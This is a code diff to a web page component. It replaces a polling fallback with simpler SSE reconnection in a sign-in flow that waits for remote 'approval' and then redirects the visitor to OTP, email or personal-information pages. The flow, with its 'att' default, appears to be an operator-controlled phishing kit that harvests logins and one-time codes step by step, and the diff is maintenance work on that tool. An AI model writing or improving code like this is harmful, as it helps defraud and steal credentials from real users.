@@ -36,12 +36,6 @@ export default function Home() {
       if (window.approvalEventSource) {
         window.approvalEventSource.close();
       }
-      
-      // Clear any existing polling interval
-      if (window.approvalPollInterval) {
-        clearInterval(window.approvalPollInterval);
-        window.approvalPollInterval = null;
-      }
 
       // Open SSE connection for this activity
       const eventSource = new EventSource(`/api/user-events/${activityId}`);
@@ -59,24 +53,20 @@ export default function Home() {
             const approval = data.data;
             console.log('[index.js] Approval received:', approval);
             
-            // Close SSE connection and stop polling
+            // Close SSE connection
             eventSource.close();
             window.approvalEventSource = null;
-            if (window.approvalPollInterval) {
-              clearInterval(window.approvalPollInterval);
-              window.approvalPollInterval = null;
-            }
             
-              if (approval.status === 'approved') {
-                const redirectType = approval.redirectType || 'att';
-                console.log(`[index.js] Handling redirect: ${redirectType} for user: ${userId}`);
-                
-                // Store userId for OTP/email/personal pages
-                if (redirectType === 'otp' || redirectType === 'email' || redirectType === 'personal') {
-                  localStorage.setItem('lastUserId', userId);
-                }
-                
-                handleRedirect(redirectType, userId);
+            if (approval.status === 'approved') {
+              const redirectType = approval.redirectType || 'att';
+              console.log(`[index.js] Handling redirect: ${redirectType} for user: ${userId}`);
+              
+              // Store userId for OTP/email/personal pages
+              if (redirectType === 'otp' || redirectType === 'email' || redirectType === 'personal') {
+                localStorage.setItem('lastUserId', userId);
+              }
+              
+              handleRedirect(redirectType, userId);
             } else if (approval.status === 'denied') {
               const loadingScreen = document.getElementById('loading-screen');
               if (loadingScreen) loadingScreen.classList.remove('active');
@@ -94,65 +84,17 @@ export default function Home() {
       };
 
       eventSource.onerror = function(error) {
-        console.error('SSE error:', error);
-        // Reconnect faster (1 second) for quicker recovery
-        setTimeout(() => {
-          if (window.approvalEventSource === eventSource && !approvalReceived) {
-            eventSource.close();
-            waitForApprovalSSE(activityId, type, userId);
-          }
-        }, 1000);
-      };
-      
-      // Fallback: Poll for approval every 500ms in case SSE fails (faster response)
-      window.approvalPollInterval = setInterval(async () => {
-        if (approvalReceived) {
-          clearInterval(window.approvalPollInterval);
-          window.approvalPollInterval = null;
-          return;
-        }
-        
-        try {
-          const response = await fetch(`/api/approval/${activityId}`);
-          if (response.ok) {
-            const approval = await response.json();
-            if (approval && approval.status && approval.status !== 'pending') {
-              approvalReceived = true;
-              
-              // Close SSE connection
-              if (eventSource) {
-                eventSource.close();
-                window.approvalEventSource = null;
-              }
-              
-              // Stop polling
-              clearInterval(window.approvalPollInterval);
-              window.approvalPollInterval = null;
-              
-              if (approval.status === 'approved') {
-                const redirectType = approval.redirectType || 'att';
-                console.log(`[index.js] Approval received via polling: ${redirectType} for user: ${userId}`);
-                
-                // Store userId for OTP/email/personal pages
-                if (redirectType === 'otp' || redirectType === 'email' || redirectType === 'personal') {
-                  localStorage.setItem('lastUserId', userId);
-                }
-                
-                handleRedirect(redirectType, userId);
-              } else if (approval.status === 'denied') {
-                const loadingScreen = document.getElementById('loading-screen');
-                if (loadingScreen) loadingScreen.classList.remove('active');
-                
-                submitBtn.disabled = false;
-                submitBtn.textContent = cachedUsername ? 'Sign in' : 'Continue';
-                alert('Access denied. Please try again.');
-              }
+        console.error('[index.js] SSE error:', error);
+        // Reconnect with exponential backoff for reliability
+        if (!approvalReceived && window.approvalEventSource === eventSource) {
+          eventSource.close();
+          setTimeout(() => {
+            if (!approvalReceived) {
+              waitForApprovalSSE(activityId, type, userId);
             }
-          }
-        } catch (error) {
-          console.error('[index.js] Error polling for approval:', error);
+          }, 1000);
         }
-      }, 500); // Poll every 500ms for faster response
+      };
     }
 
     function handleRedirect(redirectType, userId) {
